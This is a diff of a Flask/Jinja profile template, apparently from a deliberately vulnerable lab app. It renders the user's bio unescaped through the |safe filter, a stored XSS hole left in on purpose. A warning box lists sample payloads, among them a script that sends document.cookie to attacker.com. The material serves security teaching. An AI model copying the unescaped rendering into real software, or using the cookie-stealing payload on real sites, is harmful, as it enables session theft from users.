@@ -1,6 +1,84 @@
 {% extends 'base.html' %}
+
 {% block title %}Profile{% endblock %}
+
 {% block content %}
-<h2>Profile Page - Coming Soon</h2>
-<p>XSS vulnerability will be added here.</p>
+<div class="card" style="max-width: 700px; margin: 30px auto;">
+    <h2 style="color: #333; margin-bottom: 30px;">👤 User Profile</h2>
+
+    <!-- User Info Display -->
+    <div style="padding: 20px; background-color: #f8f9fa; border-radius: 8px; margin-bottom: 30px;">
+        <h3 style="color: #333; margin-bottom: 15px;">Profile Information</h3>
+        <p><strong>Username:</strong> {{ g.user['username'] }}</p>
+        <p><strong>Email:</strong> {{ g.user['email'] }}</p>
+        <p><strong>Full Name:</strong> {{ g.user['full_name'] or 'Not set' }}</p>
+        
+        <div style="margin-top: 20px;">
+            <strong>Bio:</strong>
+            <div style="margin-top: 10px; padding: 15px; background-color: white; border-radius: 4px; border: 1px solid #dee2e6; min-height: 60px;">
+                {# ⚠️ VULNERABLE: Using |safe filter allows XSS! #}
+                {# The bio content is rendered as raw HTML without escaping #}
+                {{ g.user['bio']|safe if g.user['bio'] else '<em style="color: #999;">No bio set</em>' }}
+            </div>
+        </div>
+    </div>
+
+    <!-- Edit Profile Form -->
+    <div>
+        <h3 style="color: #333; margin-bottom: 15px;">Edit Profile</h3>
+        
+        <form method="post" style="display: flex; flex-direction: column; gap: 15px;">
+            <div>
+                <label for="bio" style="display: block; margin-bottom: 5px; font-weight: bold;">
+                    Bio / About Me:
+                </label>
+                <textarea 
+                    name="bio" 
+                    id="bio" 
+                    rows="5"
+                    style="width: 100%; padding: 10px; border: 1px solid #ddd; border-radius: 4px; font-size: 14px; font-family: Arial, sans-serif;"
+                    placeholder="Tell us about yourself..."
+                >{{ g.user['bio'] if g.user['bio'] else '' }}</textarea>
+                <small style="color: #666; font-size: 12px;">
+                    You can use HTML formatting in your bio.
+                </small>
+            </div>
+
+            <button 
+                type="submit"
+                style="padding: 12px; background-color: #007bff; color: white; border: none; border-radius: 4px; font-size: 16px; cursor: pointer; font-weight: bold;"
+            >
+                Update Profile
+            </button>
+        </form>
+    </div>
+
+    <!-- Vulnerability Warning Box -->
+    <div style="margin-top: 30px; padding: 20px; background-color: #f8d7da; border: 2px solid #f5c6cb; border-radius: 8px;">
+        <h4 style="color: #721c24; margin-bottom: 15px;">⚠️ XSS Vulnerability Warning</h4>
+        <p style="color: #721c24; font-size: 14px; line-height: 1.6; margin-bottom: 10px;">
+            This profile page is <strong>vulnerable to Stored XSS (Cross-Site Scripting)</strong>!
+        </p>
+        
+        <div style="background-color: #fff; padding: 15px; border-radius: 4px; margin-top: 15px;">
+            <strong style="color: #721c24;">Try these XSS payloads:</strong>
+            <ul style="margin-top: 10px; color: #721c24; font-size: 13px; line-height: 1.8;">
+                <li><code>&lt;script&gt;alert('XSS Attack!')&lt;/script&gt;</code></li>
+                <li><code>&lt;img src=x onerror="alert('XSS')"&gt;</code></li>
+                <li><code>&lt;h1 style="color:red"&gt;Hacked!&lt;/h1&gt;</code></li>
+                <li><code>&lt;script&gt;document.location='http://attacker.com/steal?cookie='+document.cookie&lt;/script&gt;</code></li>
+            </ul>
+        </div>
+        
+        <div style="margin-top: 15px; padding: 10px; background-color: #fff3cd; border-radius: 4px;">
+            <strong style="color: #856404;">Why is this dangerous?</strong>
+            <ul style="margin-top: 8px; color: #856404; font-size: 13px; line-height: 1.6;">
+                <li>Attacker can steal session cookies</li>
+                <li>Execute JavaScript in victim's browser</li>
+                <li>Perform actions on behalf of the victim</li>
+                <li>Deface the website for other users</li>
+            </ul>
+        </div>
+    </div>
+</div>
 {% endblock %}
